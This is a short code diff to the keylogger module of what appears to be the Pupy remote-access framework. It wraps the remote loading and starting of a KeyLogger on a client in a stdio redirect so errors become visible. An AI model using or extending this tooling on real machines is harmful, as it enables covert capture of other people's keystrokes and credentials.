@@ -8,6 +8,7 @@ import logging
 import struct
 import traceback
 import time
+from pupylib.utils.rpyc_utils import redirected_stdio
 
 __class_name__="KeyloggerModule"
 
@@ -34,8 +35,9 @@ class KeyloggerModule(PupyModule):
 				self.error("the keylogger is already started")
 			else:
 				self.client.load_package("pupwinutils.keylogger")
-				self.keylogger=self.client.conn.modules["pupwinutils.keylogger"].KeyLogger()
-				self.keylogger.start()
+				with redirected_stdio(self.client.conn): #to see the output exception in case of error
+					self.keylogger=self.client.conn.modules["pupwinutils.keylogger"].KeyLogger()
+					self.keylogger.start()
 		else:
 			if not self.keylogger:
 				self.error("the keylogger is not running")
